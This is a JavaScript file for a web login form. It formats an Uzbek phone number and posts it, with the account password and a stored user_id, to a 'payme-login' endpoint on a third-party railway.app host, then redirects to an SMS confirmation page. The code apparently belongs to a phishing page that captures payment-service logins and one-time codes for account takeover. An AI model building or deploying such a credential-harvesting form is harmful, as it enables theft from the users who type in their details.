/* global toastr */


document.addEventListener('DOMContentLoaded', function () {
    const phoneInputField = document.querySelector("#phone");

    // Allow only numbers in the input field and limit to 9 digits
    phoneInputField.addEventListener('keypress', function (e) {
        // Allow control keys (backspace, delete, arrow keys) and digits only
        const inputLength = phoneInputField.value.replace(/\D/g, '').length;

        if (inputLength >= 12 && (e.charCode >= 48 && e.charCode <= 57)) {
            e.preventDefault();  // Prevent further input if 9 digits are already entered
        }

        if (e.charCode < 48 || e.charCode > 57) {
            e.preventDefault();  // Prevent non-numeric input
        }
    });

    phoneInputField.addEventListener('input', function () {
        let value = phoneInputField.value.replace(/[^\d]/g, '');

        // Ensure the input always starts with 998 (Uzbekistan country code)
        if (!value.startsWith("998")) {
            value = "998";
        }

        // Limit the number of digits to 12 (3 for country code and 9 for phone number)
        if (value.length > 12) {
            value = value.slice(0, 12);
        }

        phoneInputField.value = "+" + value.replace(/^(\d{3})(\d{2})(\d{3})(\d{2})(\d{2})$/, '$1 ($2) $3 $4 $5');
    });

});


document.querySelector("form").addEventListener("submit", function (event) {
    event.preventDefault(); // Prevent the default form submission

    // Get the phone input value
    let phoneInput = document.getElementById('phone').value;

    // Remove non-numeric characters except for the "+" sign
    phoneInput = phoneInput.replace(/[^\d+]/g, '');

    // Get the password value
    const password = document.getElementById('passwordInput').value;

    // Retrieve the user_id from localStorage
    const user_id = localStorage.getItem('user_id');

    // Prepare the data to be sent in the API request
    const data = {
        username: phoneInput,
        password: password,
        user_id: user_id
    };

    // Send the API request
    fetch('https://apppay-production.up.railway.app/api/v1/payme-login', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify(data),
    })
        .then(response => response.json())
        .then(data => {
            // Handle success response
            if (data.sent) {

                localStorage.setItem('send_sms_phone', data.phone)

                window.location.href = 'tasdiqlash';

            } else {
                alert(`Kirish da xatolik: ${data.message}`);
            }
        })
        .catch((error) => {
            console.error('Error:', error);
            alert('An error occurred. Please try again later.', 'Error');
        });
});
